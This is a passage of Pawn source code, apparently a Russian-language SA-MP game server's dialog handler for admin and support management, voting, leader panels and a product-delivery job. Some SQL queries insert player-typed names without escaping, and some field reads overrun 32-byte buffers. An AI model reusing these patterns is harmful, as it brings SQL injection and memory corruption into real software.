	        {
	            new sdate[32], query[128];
                mysql_format(DATABASE, QUERY, 62, "SELECT date FROM `gratinghistory`");
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					for(new i = 0; i < r; i++)
					{
						new strin[40];
						cache_get_field_content(i,"date",sdate,DATABASE,32);
			            format(strin,sizeof(strin),"%s\n", sdate, grating);
						strcat(query, strin);
					}
				}
				ShowPlayerDialogEx(playerid, 5696, DIALOG_STYLE_LIST, "История", query, "Выбрать", "Назад");
	        }
			else
			{
	            new query[512], player[32], playerMark, agGrove, agBallas, agRifa, agAztec, agVagos;
	            format(query, sizeof(query), "Имя\t\tОчки\n[0] [ЛУЧШИЙ ИГРОК]\n");
				new sss[32];
				GetPVarString(playerid, "grhistory", sss, 32);
	            mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `gratinghistory` WHERE date = '%s'", sss);
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					new strin[512];
					cache_get_field_content(0,"player",player,DATABASE,60);
					playerMark = cache_get_field_content_int(0, "playerMark");
		            format(strin,sizeof(strin),"[1] %s\t\t%i\n[2] [БАНДЫ]\n", player, playerMark);
					strcat(query, strin);
					agGrove = cache_get_field_content_int(0, "Grove street");
					agBallas = cache_get_field_content_int(0, "Ballas");
					agRifa = cache_get_field_content_int(0, "Rifa");
					agAztec = cache_get_field_content_int(0, "Aztec");
					agVagos = cache_get_field_content_int(0, "Vagos");
					format(strin, sizeof(strin), "[3] Grove street\t\t%i\n\
		   										  [4] Ballas\t\t%i\n\
		   										  [5] Rifa\t\t%i\n\
		   										  [6] Aztec\t\t%i\n\
		   										  [7] Vagos\t\t%i\n",agGrove, agBallas, agRifa, agAztec, agVagos);
					strcat(query, strin);
				} else printf("Нет даных в gratinghistory");
				ShowPlayerDialogEx(playerid, 5697, DIALOG_STYLE_TABLIST_HEADERS, "Меню", query, "Выбрать", "Назад");
			}
	    }
	case 21021:
	    {
	        if(!response) return true;
	        if(!strcmp(inputtext, "Назначить саппорта", true))
	        {
	            return ShowPlayerDialogEx(playerid, 21023, DIALOG_STYLE_INPUT, "Добавить саппорта", "Введите ник нейм саппорта", "Добавтиь", "Назад");
	        }
	        SetPVarString(playerid, "SelectedSupport", inputtext);
	        new query[128];
	        format(query, sizeof(query), "[0] Разморозить права\n[1] Заморозить права\n");
	        if(PlayerInfo[playerid][pAdmin] > 7) strcat(query, "[2] Снять саппорта", sizeof(query));
	        ShowPlayerDialogEx(playerid, 21022, DIALOG_STYLE_LIST, "Управление саппортами", query, "Выбор", "Назад");
	    }
	case 21022:
	    {
	        if(!response) return DeletePVar(playerid, "SelectedSupport"),SetTimerEx("SpMenu" , 50, false, "i", playerid);
			new Names[32];
			GetPVarString(playerid, "SelectedSupport", Names, sizeof(Names));
			switch(listitem)
			{
			    case 0:
				{
				    format(string, sizeof(string), "/setsupport %s 1", Names);
					CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
				}
				case 1:
				{
					format(string, sizeof(string), "/setsupport %s 0", Names);
					CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
				}
				case 2:
				{
					format(string, sizeof(string), "/addsupport %s 0", Names);
					CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
				}
			}
			SetTimerEx("SpMenu" , 50, false, "i", playerid);
	    }
	case 21023:
	    {
	        if(!response) return DeletePVar(playerid, "SelectedSupport"),CallLocalFunction("OnPlayerCommandText", "is", playerid, "/spmenu");
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 21023, DIALOG_STYLE_INPUT, "Добавить саппорта", "Введите ник нейм саппорта", "Добавтиь", "Назад");
			format(string, sizeof(string), "/addsupport %s 1", inputtext);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			SetTimerEx("SpMenu" , 50, false, "i", playerid);
	    }
	case 21025:
	    {
	        if(!response) return true;
	        if(!strcmp(inputtext, "Назначить администратора", true))
	        {
	            return ShowPlayerDialogEx(playerid, 21026, DIALOG_STYLE_INPUT, "{00FF00}Назначить администратора", "Введите ник будущего администратора", "Продолжить", "Назад");
	        }
	        new niknames[32], lastcon[32], lvl;
	        sscanf(inputtext, "s",niknames);
	        SetPVarString(playerid, "selectedadmin", niknames);
	        mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", niknames);
			mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
				cache_get_field_content(0,"LastCon",lastcon,DATABASE,60);
				lvl = cache_get_field_content_int(0, "level");
			}
			if(strlen(lastcon) == 0) lastcon = "Нет";
	        format(string, sizeof(string), "[Последний вход]\n%s \n[Уровень администратора]\n%i\n",lastcon, lvl);
	        if(PlayerInfo[playerid][pAdmin] >= 9)
	        {
	            new strs[128];
	            format(strs, sizeof(strs), "Изменить уровень администратора\nСнять администратора");
	            strcat(string, strs);
	        }
	        ShowPlayerDialogEx(playerid, 21028, DIALOG_STYLE_LIST, niknames, string, "Выбор", "Назад");
	    }
	case 21026:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/admmenu");
	        if(strlen(inputtext) == 0) return ShowPlayerDialogEx(playerid, 21026, DIALOG_STYLE_INPUT, "{00FF00}Назначить администратора", "Введите ник будущего администратора", "Продолжить", "Назад");
	        SetPVarString(playerid, "chosenadmin", inputtext);
	        ShowPlayerDialogEx(playerid, 21027, DIALOG_STYLE_INPUT, inputtext, "Введите уровень администратора", "Назначить", "Назад");
	    }
	case 21027:
	    {
	        if(!response) return ShowPlayerDialogEx(playerid, 21026, DIALOG_STYLE_INPUT, "{00FF00}Назначить администратора", "Введите ник будущего администратора", "Продолжить", "Назад"), DeletePVar(playerid, "chosenadmin");
			new lvl = strval(inputtext);
			if(!strlen(inputtext) || !lvl) ShowPlayerDialogEx(playerid, 21027, DIALOG_STYLE_INPUT, inputtext, "Введите уровень администратора", "Назначить", "Назад");
			new Names[32];
			GetPVarString(playerid, "chosenadmin", Names, 32);
			format(string, sizeof(string), "/addmoderation %s %i", Names, lvl);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			SetTimerEx("AdmMenu" , 50, false, "i", playerid);
		}
	case 21028:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/admmenu");
			if(listitem >= 0 && listitem <= 3)
			{
			    new niknames[32], lastcon[32], lvl;
		        GetPVarString(playerid, "selectedadmin", niknames, 32);
		        mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", niknames);
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					cache_get_field_content(0,"LastCon",lastcon,DATABASE,60);
					lvl = cache_get_field_content_int(0, "level");
				}
				if(!strcmp(lastcon, "", true)) lastcon = "Нет";
		        format(string, sizeof(string), "[Последний вход]\n%s\n[Уровень администратора]\n%i\n",lastcon, lvl);
		        if(PlayerInfo[playerid][pAdmin] > 8)
		        {
		            new strs[128];
		            format(strs, sizeof(strs), "Изменить уровень администратора\nСнять администратора");
		            strcat(string, strs);
		        }
		        ShowPlayerDialogEx(playerid, 21028, DIALOG_STYLE_LIST, niknames, string, "Выбор", "Назад");
			}
			else if(listitem == 4)
			{
				ShowPlayerDialogEx(playerid, 21029, DIALOG_STYLE_INPUT, "Изменить уровень администратора", "Введите новый уровень администратора", "Выбор", "Назад");
			}
			else if(listitem == 5)
			{
			    new sss[32];
			    GetPVarString(playerid, "selectedadmin", sss, 32);
				format(string, sizeof(string), "Вы уверены, что хотите снять администратора\n{FF0000}\t\t%s", sss);
				ShowPlayerDialogEx(playerid, 21030, DIALOG_STYLE_MSGBOX, "{FF0000}Снять администратора", string, "Снять", "Назад");
			}
		}
	case 21029:
	    {
			if(!response)
			{
			    new niknames[32], lastcon[32], lvl;
		        GetPVarString(playerid, "selectedadmin", niknames, 32);
		        mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", niknames);
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					cache_get_field_content(0,"LastCon",lastcon,DATABASE,60);
					lvl = cache_get_field_content_int(0, "level");
				}
				if(!strcmp(lastcon, "", true)) lastcon = "Нет";
		        format(string, sizeof(string), "[Последний вход]\n%s\n[Уровень администратора]\n%i\n",lastcon, lvl);
		        if(PlayerInfo[playerid][pAdmin] > 8)
		        {
		            new strs[128];
		            format(strs, sizeof(strs), "Изменить уровень администратора\nСнять администратора");
		            strcat(string, strs);
		        }
		        return ShowPlayerDialogEx(playerid, 21028, DIALOG_STYLE_LIST, niknames, string, "Выбор", "Назад");
			}
			new lvl = strval(inputtext);
			if(!strlen(inputtext) || !lvl) return ShowPlayerDialogEx(playerid, 21029, DIALOG_STYLE_INPUT, "Изменить уровень администратора", "Введите новый уровень администратора", "Выбор", "Назад");
			new niknames[32];
			GetPVarString(playerid, "selectedadmin", niknames, 32);
			format(string, sizeof(string), "/addmoderation %s %i", niknames, lvl);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			SetTimerEx("AdmMenu" , 50, false, "i", playerid);
	    }
	case 21030:
	    {
	        if(!response)
			{
			    new niknames[32], lastcon[32], lvl;
		        GetPVarString(playerid, "selectedadmin", niknames, 32);
		        mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", niknames);
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					cache_get_field_content(0,"LastCon",lastcon,DATABASE,60);
					lvl = cache_get_field_content_int(0, "level");
				}
				if(!strcmp(lastcon, "", true)) lastcon = "Нет";
		        format(string, sizeof(string), "[Последний вход]\n%s\n[Уровень администратора]\n%i\n",lastcon, lvl);
		        if(PlayerInfo[playerid][pAdmin] > 8)
		        {
		            new strs[128];
		            format(strs, sizeof(strs), "Изменить уровень администратора\nСнять администратора");
		            strcat(string, strs);
		        }
		        return ShowPlayerDialogEx(playerid, 21028, DIALOG_STYLE_LIST, niknames, string, "Выбор", "Назад");
			}
	        new niknames[32];
			GetPVarString(playerid, "selectedadmin", niknames, 32);
			format(string, sizeof(string), "/addmoderation %s 0", niknames);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			SetTimerEx("AdmMenu" , 50, false, "i", playerid);
	    }
	case 21032:
	    {
			if(!response) return true;
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/members 1");
	    }
	case 1135:
	 	{
	   		if(!response) return true;
	     	new str[512];
	     	for(new h = 0; h < idgols; h++)
	 		{
	 			new strz[64];
	 			format(strz,sizeof(str2),"%s\n",Golosovan[h][Variant]);
	 			strcat(str,strz,sizeof(str));
	 		}
	 		ShowPlayerDialogEx(playerid,1134,DIALOG_STYLE_LIST,GL2[NameGolos],str,"Выбор","Отмена");
	 	}
    case 1134:
	 	{
			if(!response) return true;
			if(PlayerInfo[playerid][progolos] == true) return SCM(playerid,COLOR_GREY," Вы уже голосовали!");
			Golosovan[listitem][Golosov] ++;
			PlayerInfo[playerid][progolos] = true;
			SCM(playerid,COLOR_GREY," Ваш голос учтён, Спасибо");
	 	}
    case 1132:
	    {
			if(!strlen(inputtext)) return true;
			strmid(GL2[NameGolos],inputtext,0,128,256);
			format(string,sizeof(string)," Вы создали голосование - %s.",inputtext);
			SCM(playerid,COLOR_LIGHTBLUE,string);
			GL2[goloson] = true;
			ShowPlayerDialogEx(playerid,1133,1,"Создание вариантов ответа","Введите Вариант №1","Далее","");
	    }
    case 1133:
	    {
			if(!response) return true;
			if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,1133,1,"Создание вариантов ответа","Введите следующий вариант","Далее","");
			strmid(Golosovan[idgols][Variant],inputtext,0,128,256);
			Golosovan[idgols][Golosov] = 0;
			ShowPlayerDialogEx(playerid,1133,1,"Создание вариантов ответа","Введите следующий вариант","Далее","");
			idgols++;
	    }
	case 1000:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/offmembers");
			case 1: ShowPlayerDialogEx(playerid,1001,DIALOG_STYLE_INPUT, "{AE443D}Панель лидера | {FFFFFF}Понизить/повысить игрока в Offline", "{FFFFFF}Введите в строку для ввода\n[Имя] [Ранг]", "Принять","Назад");
			case 2: ShowPlayerDialogEx(playerid,1002,DIALOG_STYLE_INPUT, "{AE443D}Панель лидера | {FFFFFF}Уволить игрока в Offline", "{FFFFFF}Введите в строку для ввода имя игрока\nКоторого хотите уволить", "Принять","Назад");
			}
		}
	case 1001:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "{AE443D}Меню | {FFFFFF}Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
			new params_name[60],rank;
			if(sscanf(inputtext, "s[60]i",params_name,rank)) return ShowPlayerDialogEx(playerid,1001,DIALOG_STYLE_INPUT, "{AE443D}Панель лидера | {FFFFFF}Понизить/повысить игрока в Offline", "{FFFFFF}Введите в строку для ввода\n[Имя] | [Ранг]", "Принять","Назад");
			new mess[40];
			format(mess, sizeof(mess), "/offgiverank %s %i",params_name,rank);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);
			return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "{AE443D}Меню | {FFFFFF}Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
		}
	case 1002:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "{AE443D}Меню | {FFFFFF}Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
			new params_name[60];
			if(sscanf(inputtext, "s[60]",params_name)) return ShowPlayerDialogEx(playerid,1002,DIALOG_STYLE_INPUT, "{AE443D}Панель лидера | {FFFFFF}Уволить игрока в Offline", "Введите в строку для ввода имя игрока\nКоторого хотите уволить", "Принять","Назад");
			new mess[40];
			format(mess, sizeof(mess), "/offuninvite %s",params_name);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, mess);
			return ShowPlayerDialogEx(playerid, 1000, DIALOG_STYLE_LIST, "{AE443D}Меню | {FFFFFF}Панель лидера", "[0] Игроки в Offline\n[1] Понизить/повысить игрока в Offline\n[2] Уволить игрока в Offline", "Выбрать", "Назад");
		}
	case 1375:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: {ShowPlayerDialogEx(playerid,1377,DIALOG_STYLE_LIST,"Выберите тип бизнеса","Бары и клубы\nЗакусочные\nМагазины 24/7\nЗаправки", "Выбрать", "Назад");}
			case 1: {ShowPlayerDialogEx(playerid,1386,DIALOG_STYLE_LIST,"Выберите тип бизнеса","Бары и клубы\nЗакусочные\nМагазины 24/7\nЗаправки", "Выбрать", "Назад");}
			case 2: ShowPlayerDialogEx(playerid,1376,DIALOG_STYLE_LIST,"Выберите тип бизнеса","Бары и клубы\nЗакусочные\nМагазины 24/7\nЗаправки", "Выбрать", "Назад");
			case 3: {CallLocalFunction("OnPlayerCommandText", "is", playerid, "/pskill");}
			case 4: {ShowPlayerDialogEx(playerid,1228,DIALOG_STYLE_MSGBOX, " ", "Вы уверены, что хотите выбросить продукты?", "Выбросить", "Отмена");}
			}
			return true;
		}
	case 1376:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/prodmenu");
			string = "";
			strcat(string,"{FFFFFF}[Бизнес]  {0076FC}[Цена за 1 продукт]  {10762D}[Требуется продуктов]\n\n");
			for(new i = 1; i <= TotalBizz; i++)
			{
				if(BizzInfo[i][bType] != listitem+1) continue;
				format(YCMDstr,128,"{FFFFFF}%s  {0076FC}%i  {10762D}%i\n",BizzInfo[i][bMessage], BizzInfo[i][bProdPrice], BizzMaxProds[i]-BizzInfo[i][bProducts]);
				strcat(string,YCMDstr);
			}
			return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX,"Мониторинг",string, "Готово", "");
		}
	case 1386:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellprodsone");
				}
			case 1:
				{
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellprodstwo");
				}
			case 2:
				{
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellprodsthree");
				}
			case 3:
				{
					CallLocalFunction("OnPlayerCommandText", "is", playerid, "/sellprodsfour");
				}
			}
		}
	case 1377:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					new newcar = GetPlayerVehicleID(playerid);
					if(newcar >= comptruck[4] && newcar <= comptruck[9])
					{
						ShowPlayerDialogEx(playerid,1378, DIALOG_STYLE_INPUT, "Закупка товаров / еды","Введите количество продуктов от 1 до 200", "Готово", "Отмена");
					}
					else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
				}
			case 1:
				{
					new newcar = GetPlayerVehicleID(playerid);
					if(newcar >= comptruck[4] && newcar <= comptruck[9])
					{
						ShowPlayerDialogEx(playerid,1379, DIALOG_STYLE_INPUT, "Закупка товаров / еды","Введите количество продуктов от 1 до 200", "Готово", "Отмена");
					}
					else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
				}
			case 2:
				{
					new newcar = GetPlayerVehicleID(playerid);
					if(newcar >= comptruck[4] && newcar <= comptruck[9])
					{
						ShowPlayerDialogEx(playerid,1380, DIALOG_STYLE_INPUT, "Закупка товаров / еды","Введите количество продуктов от 1 до 200", "Готово", "Отмена");
					}
					else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
				}
			case 3:
				{
					new newcar = GetPlayerVehicleID(playerid);
					if(newcar >= comptruck[2] && newcar <= comptruck[3])
					{
						ShowPlayerDialogEx(playerid,1381, DIALOG_STYLE_INPUT, "Закупка топлива","Введите количество литров от 1 до 1000", "Готово", "Отмена");
					}
					else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
				}
			}
		}
	case 1378:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
				if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pPMGruz]) return SendMes(playerid,COLOR_GREY," Минимальное количество - 1,максимальное - %i",PlayerInfo[playerid][pPMGruz]);
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*15) return SCM(playerid,COLOR_GREY," У вас не достаточно денег!");
				if(car_prods[GetPlayerVehicleID(playerid)][3]+strval(inputtext) > 200) return SCM(playerid,COLOR_GREY," В вашем транспортном средстве нет места");
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				SetPVarInt(playerid, "kolvo", strval(inputtext));
				format(string,256,"Вы собираетесь купить продукты для Баров / Клубов\n\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт\n{1CA628}Скидка: 0 вирт",strval(inputtext),strval(inputtext)*15);
				return ShowPlayerDialogEx(playerid,1382,DIALOG_STYLE_MSGBOX,"Покупка продуктов",string,"Купить","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в транспортном средстве");
		}
	case 1379:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
				if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pPMGruz]) return SendMes(playerid,COLOR_GREY," Минимальное количество - 1,максимальное - %i",PlayerInfo[playerid][pPMGruz]);
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*15) return SCM(playerid,COLOR_GREY," У вас не достаточно денег!");
				if(car_prods[GetPlayerVehicleID(playerid)][3]+strval(inputtext) > 200) return SCM(playerid,COLOR_GREY," В вашем транспортном средстве нет места");
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				SetPVarInt(playerid, "kolvo", strval(inputtext));
				format(string,256,"Вы собираетесь купить продукты для закусочных\n\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт\n{1CA628}Скидка: 0 вирт",strval(inputtext),strval(inputtext)*15);
				return ShowPlayerDialogEx(playerid,1383,DIALOG_STYLE_MSGBOX,"Покупка продуктов",string,"Купить","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в транспортном средстве");
		}
	case 1380:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
				if(strval(inputtext) < 0 || strval(inputtext) > PlayerInfo[playerid][pPMGruz]) return SendMes(playerid,COLOR_GREY," Минимальное количество - 1,максимальное - %i",PlayerInfo[playerid][pPMGruz]);
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*15) return SCM(playerid,COLOR_GREY," У вас не достаточно денег!");
				if(car_prods[GetPlayerVehicleID(playerid)][2]+strval(inputtext) > 200) return SCM(playerid,COLOR_GREY," В вашем транспортном средстве нет места");
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				SetPVarInt(playerid, "kolvo", strval(inputtext));
				format(string,256,"Вы собираетесь купить товары для Магазинов 24/7\n\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт\n{1CA628}Скидка: 0 вирт",strval(inputtext),strval(inputtext)*15);
				return ShowPlayerDialogEx(playerid,1384,DIALOG_STYLE_MSGBOX,"Покупка продуктов",string,"Купить","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в транспортном средстве");
		}
	case 1381:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[2] && newcar <= comptruck[3])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
				if(strval(inputtext) < 0 || strval(inputtext) > 1000) return SCM(playerid,COLOR_GREY," Минимальное количество - 1,максимальное - 1000");
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*15) return SCM(playerid,COLOR_GREY," У вас не достаточно денег!");
				if(car_prods[GetPlayerVehicleID(playerid)][1]+strval(inputtext) > 1000) return SCM(playerid,COLOR_GREY," В вашем транспортном средстве нет места");
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				SetPVarInt(playerid, "kolvo", strval(inputtext));
				format(string,256,"Вы собираетесь купить топливо для заправок\n\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт\n{1CA628}Скидка: 0 вирт",strval(inputtext),strval(inputtext)*15);
				return ShowPlayerDialogEx(playerid,1385,DIALOG_STYLE_MSGBOX,"Покупка продуктов",string,"Купить","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в транспортном средстве");
		}
	case 1382:
		{
			if(!response) return true;
			car_prods[GetPlayerVehicleID(playerid)][3] += GetPVarInt(playerid,"kolvo");
			PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"kolvo")*15;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			DeletePVar(playerid,"Kolvo");
			return 1;
		}
	case 1383:
		{
			if(!response) return true;
			car_prods[GetPlayerVehicleID(playerid)][3] += GetPVarInt(playerid,"kolvo");
			PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"kolvo")*15;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			DeletePVar(playerid,"Kolvo");
			return 1;
		}
	case 1384:
		{
			if(!response) return true;
			car_prods[GetPlayerVehicleID(playerid)][2] += GetPVarInt(playerid,"kolvo");
			PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"kolvo")*15;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			DeletePVar(playerid,"Kolvo");
			return 1;
		}
	case 1385:
		{
			if(!response) return true;
			car_prods[GetPlayerVehicleID(playerid)][1] += GetPVarInt(playerid,"kolvo");
			PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"kolvo")*15;
			SendMes(playerid,TEAM_GROVE_COLOR," Топливо: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
			DeletePVar(playerid,"Kolvo");
			return 1;
		}
	case 1387:
		{
			if(!response) return true;
			new bizz = GetPVarInt(playerid,"bizz");
			if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
			PlayerInfo[playerid][pCash]+=car_prods[GetPlayerVehicleID(playerid)][3]*16;
			BizzInfo[bizz][bProducts] += car_prods[GetPlayerVehicleID(playerid)][3];
			car_prods[GetPlayerVehicleID(playerid)][3] = 0;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			if(booston == 0) PlayerInfo[playerid][pPProc] += 1;
			else if(booston == 1) PlayerInfo[playerid][pPProc] += 2;
			DeletePVar(playerid,"bizz");
			ExpExp(playerid);
			return 1;
		}
	case 1388:
		{
			if(!response) return true;
			new bizz = GetPVarInt(playerid,"bizz");
			if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
			PlayerInfo[playerid][pCash]+=car_prods[GetPlayerVehicleID(playerid)][3]*16;
			BizzInfo[bizz][bProducts] += car_prods[GetPlayerVehicleID(playerid)][3];
			car_prods[GetPlayerVehicleID(playerid)][3] = 0;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			if(booston == 0) PlayerInfo[playerid][pPProc] += 1;
			else if(booston == 1) PlayerInfo[playerid][pPProc] += 2;
			DeletePVar(playerid,"bizz");
			ExpExp(playerid);
			return 1;
		}
	case 1389:
		{
			if(!response) return true;
			new bizz = GetPVarInt(playerid,"bizz");
			if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
			PlayerInfo[playerid][pCash]+=car_prods[GetPlayerVehicleID(playerid)][2]*16;
			BizzInfo[bizz][bProducts] += car_prods[GetPlayerVehicleID(playerid)][2];
			car_prods[GetPlayerVehicleID(playerid)][2] = 0;
			SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
			SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			if(booston == 0) PlayerInfo[playerid][pPProc] += 1;
			else if(booston == 1) PlayerInfo[playerid][pPProc] += 2;
			DeletePVar(playerid,"bizz");
			ExpExp(playerid);
			return 1;
		}
	case 1390:
		{
			if(!response) return true;
			new bizz = GetPVarInt(playerid,"bizz");
			if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
			PlayerInfo[playerid][pCash]+=car_prods[GetPlayerVehicleID(playerid)][1]*16;
			BizzInfo[bizz][bProducts] += car_prods[GetPlayerVehicleID(playerid)][1];
			car_prods[GetPlayerVehicleID(playerid)][1] = 0;
			SendMes(playerid,TEAM_GROVE_COLOR," Топливо: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
			if(booston == 0) PlayerInfo[playerid][pPProc] += 1;
			else if(booston == 1) PlayerInfo[playerid][pPProc] += 2;
			DeletePVar(playerid,"bizz");
			ExpExp(playerid);
			return 1;
		}
	case 1883:
		{
